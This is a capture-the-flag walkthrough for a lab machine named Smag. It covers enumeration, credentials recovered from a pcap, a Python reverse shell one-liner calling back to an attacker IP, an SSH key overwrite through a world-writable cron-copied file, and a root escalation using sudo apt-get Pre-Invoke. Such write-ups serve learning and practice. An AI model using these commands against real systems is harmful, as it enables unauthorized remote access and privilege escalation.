## Foothold
+ **We deploy the machine and start with a nmap scan for open ports**

``nmap -sV -sC -oN scan1 10.10.163.139``

+ **There are 2 services running on default ports: ssh and http**

![1](images/nmap_scan_sg.jpg?raw=true "nmap_scan")

+ **Visiting the http site, we are welcomed by a big Smag title with a small announce from the developer of the site**

![2](images/site_sg.png?raw=true "Site")

+ **Let's perform a gobuster to search some directories on the website. I'm using the common.txt wordlist, a default wordlist on kali machines**

``gobuster dir -u http://10.10.163.139/ -w /usr/share/wordlists/dirb/common.txt``


![3](images/dirbuster.jpg?raw=true "gobuster")

+ **We found a mail directory, so let's check it out into the web browser. It seems to be like a mail message left on the website to notify a future migration. The mail was writen with the intention to arrive to the admin of the page**

![4](images/mail_page.png?raw=true "mail_page")

+ **Inside the first Network Migration box of the message, we can spot the dHJhY2Uy.pcap, a linked file which seems to be a packet data of this network. Let's download that file and go into a Wireshark analysis of this packet.**

![5](images/wiresh_packet.png?raw=true "wireshark_analysis")

+ **We can spot a POST login request inside the data packet, so let's follow TCP stream into this packet**

![6](images/tcp_stream.png?raw=true "tcp_stream")

+ **Bingo! We found some credentials in plain text form. Looking in the picture above us, we can see the Host that has been used in the POST login request: development.smag.thm. If we are trying to access that page, we're having trouble finding that site... But, judging on the mails that the developers shared between them, the website suffered a migration, so let's just try to change our hosts list to override the DNS**

``sudo vim /etc/hosts``

![7](images/hosts.jpg?raw=true "hosts")

+ **Now, let's try to access the development.smag.thm/login.php page so we can use our credentials**

![7](images/login_1.jpg?raw=true "login")

+ **We are welcomed by a big title 'Enter a command' with a box below. I tried some several linux commands like ls, whoami, etc, but i can't see no output. So i've tried to download a file on the box machine with the wget, hosting a simple python server on mine, just to check if the commands are available and if it's worth trying a reverse shell.**

![8](images/wget.jpg?raw=true "wget")

## User escalation
+ **It's all working, we have the GET request so let's move on to a reverse shell, using python3. I've tried with python but not working, because probably on the machine a python3 is installed.**
  **Firstly, listen to the 1234 port**
``nc -lvnp 1234``

``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``

 **And here it's our shell, connected with the www-data user. Let's upgrade it to an interactive one**

``python3 -c 'import pty; pty.spawn("/bin/bash")'``

![9](images/entered_2.jpg?raw=true "shell")

+ **Let's look into the crontab file and understand it. We have a cron which tells us that the root user is making an overwriting action every minute through the cat command from the** jake_id_rsa.pub.backup **file to the** authorized_keys **file of the jake user. This means that if we can modify the jake_id_rsa.pub.backup content, we can connect with the jake user on the ssh service.**

![10](images/crontab.jpg?raw=true "crontab")

 **Luckily, the** jake_id_rsa.pub.backup **file has writing permission for every user.**

![11](images/fileperm.jpg?raw=true "fileperm")

+ **Let's copy our public key into the remote box.**

``cat /home/kali/.ssh/id_rsa.pub``

``echo "your_id_rsa.pub" > /opt/.backups/jake_id_rsa.pub.backup``

![12](images/copy_id.jpg?raw=true "copy_id")

![13](images/copy_id_2.jpg?raw=true "copy_id_2")


+ **Now, we have overwritten the public ssh and we can use public key authentication. Voila, there's our user flag**

![13](images/user_flag.jpg?raw=true "user_flag")

## Root Escalation

+ **Running the** ``sudo -l`` **command, we can see the allowed commands for the user jake. He has a powerful accessible command to run: apt-get, which is the command line tool to interact with this packaging system.**

![14](images/sudola.jpg?raw=true "sudo -l")

+ **Exploiting the apt-get vulnerability, we can use the tool to gain a root access, using the update option and simultanously invoking the bash into the root account**

``sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash``

 ![15](images/root_flag_1.jpg?raw=true "root_flag")

 **So here we got the root flag. It was a funny box with an interesting vulnerability based on apt tool, a very useful box for beginners**
